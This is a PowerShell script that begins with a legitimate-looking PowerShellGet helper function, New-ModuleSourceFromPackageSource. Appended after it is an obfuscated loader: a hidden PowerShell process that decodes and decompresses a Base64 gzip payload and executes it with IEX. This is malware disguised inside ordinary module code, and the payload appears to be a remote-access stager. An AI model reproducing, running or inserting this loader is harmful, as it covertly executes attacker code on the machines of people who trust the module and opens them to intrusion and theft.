function New-ModuleSourceFromPackageSource
{
    param
    (
        [Parameter(Mandatory=$true)]
        $PackageSource
    )

    $moduleSource = Microsoft.PowerShell.Utility\New-Object PSCustomObject -Property ([ordered]@{
            Name = $PackageSource.Name
            SourceLocation =  $PackageSource.Location
            Trusted=$PackageSource.IsTrusted
            Registered=$PackageSource.IsRegistered
            InstallationPolicy = $PackageSource.Details['InstallationPolicy']
            PackageManagementProvider=$PackageSource.Details['PackageManagementProvider']
            PublishLocation=$PackageSource.Details[$script:PublishLocation]
            ScriptSourceLocation=$PackageSource.Details[$script:ScriptSourceLocation]
            ScriptPublishLocation=$PackageSource.Details[$script:ScriptPublishLocation]
            ProviderOptions = @{}
        })

    $PackageSource.Details.GetEnumerator() | Microsoft.PowerShell.Core\ForEach-Object {
                                                if($_.Key -ne 'PackageManagementProvider' -and
                                                   $_.Key -ne $script:PublishLocation -and
                                                   $_.Key -ne $script:ScriptPublishLocation -and
                                                   $_.Key -ne $script:ScriptSourceLocation -and
                                                   $_.Key -ne 'InstallationPolicy')
                                                {
                                                    $moduleSource.ProviderOptions[$_.Key] = $_.Value
                                                }
                                             }

    $moduleSource.PSTypeNames.Insert(0, "Microsoft.PowerShell.Commands.PSRepository")

    
    Write-Output -InputObject $moduleSource
}
if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-nop -w hidden -c $s=New-Object IO.MemoryStream(,[Convert]::FromBase64String(''H4sIANLUNlgCA7VWa2/aShD9nEr9D1aFZFslGAhtmkiV7trmFR6BOJgQiqKNvbYXFi+xl/Bo+9/vGOyUqEmV6upaidj1zOyePXNmx94ydATlobQIGk5P+v7+3VEPR3guKbl1q3eXl3LC2kQ3A4OsrtSjIzDngi/FO+/eYYN6vSZ9lZQxWixMPsc0nJyfG8soIqHYzwt1IlAck/k9oyRWVOmHNAxIRI4v76fEEdJ3KXdXqDN+j1nqtjGwExDpGIVuYmtzByfoCtaCUaHI377J6vi4NClUH5aYxYpsbWJB5gWXMVmVfqrJhtebBVHkDnUiHnNPFIY0PCkXBmGMPdKF1R5Jh4iAu7GswmngLyJiGYXSs3MlC+3dFBmGvYg7yHUjEkNUoRk+8hlRcuGSsbz0jzJOUVwtQ0HnBOyCRHxhkeiROiQuNHDoMnJFvInSJavs8G8NUg6DwKsnIjUP6fkD3A53l4zsV5DV3wHvUqvC8zy9wMfP9+/ev/MyTbiVu2L8qbs9lAWMjsa7MQHASo/HdOf7VSrmpQ5siQWPNjDNXUdLok6kcZKQ8WQi5bZlsX6Y4cYg8Gf519cpZUEQwuNr0o1X8HZsc+pOICrNWm51b1dnNESJ7XUFmsSjITE3IZ5TJxOZ8lIeiMfI7tiFzK0L2BQ5NRDXJIz4WCSM5qXx72HVORVPsfqSMpdEyIFcxoAK0qw+B7NPkiI3ww6ZA2X7uQwp8UDaJPNO5bzJdk/m4CQbDMdxXuotobacvGQRzIibl1AY09SEloLvhvIvuJ0lE9TBsciWm6iHXKZ7GjyMRbR0IJNw/mtrQRyKWUJHXmpQl+gbi/rZ3vKLZBiYMRr6sNIjJAPeJCRYItFHBDCfaUEtWEQ05wtG5uC7K/gawz6Ud1ocO2Fhn7jyS2gz4e9VnnCTkXKAFRJuMS7ykk0jAXdHwnMqrv+G5uACecJlRCTNlJLV1FjfiKQKchxtWvPRwkhkm9K2IykSQFAt4nMdx+RzxRIR0Kd80C6pgeAZNUPWcfQZLaEVLTU78D+gJ01unrqti2lDi8x14KFm3Ow0ema/0ag8Xlh2RVjVpmj1mqJTvZlOLdS4GozEbRM1rmlxNqpsFxd0a7WRO1prn7f6dlXU19up73oj0/P8U8+6Kn2q0fbQ6OvFMm6b1WV7qK/0YiWu0lWjTwf92UVN3I9shgee5t+UzjBdt6OpXeKdbROhenDibC88ux503M2ooZ0NKzNURcgIq3ZN562RHqGeZmPf5qvWVPPrvoH0mkPJbX9Q0/v9mo4G9emDeab5EHuDA31ol+nt4uYqgHkNILS0YqXpki0f9YGkOkfYvwIf3yg7gQc+5kekf+zyuIxnOkc6+NRuHwDXaFHrMbBfD8oc2ax7g1H7dlPTtNKoV0GNIh3WfZQsiX29j1H8aG5NrWS73B1+6o48zb5hp5ppXC8cT9O0VcNsObel9ZfL0y/tIbXnHA00zf6Q6AMEknPPVp/1u4OMv3bpd3AUB5iBEuAWz0q0xqNaeiP3OE0iFGXfrWckCgmD7gb9LxM2Yow7SYN4uryhQe3bxgQqdQDDk/KLI1V6clR/NY3s1fn5LUBNqiYVcKFNQl8E+eL6pFiEu7+4rhThwG8/osEXG+VpuXzSP1KmDndhu13UpIZyj0b5fyYxrdwAfty3kPjr3R+sbyK2mM8O/5vh+Yu/4vjvGRhiKsDVgtuHkX2LfJ2IVDgHnxiQIlCElz7JF9/lUhx34cPjXxzhFCJqCgAA''));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);

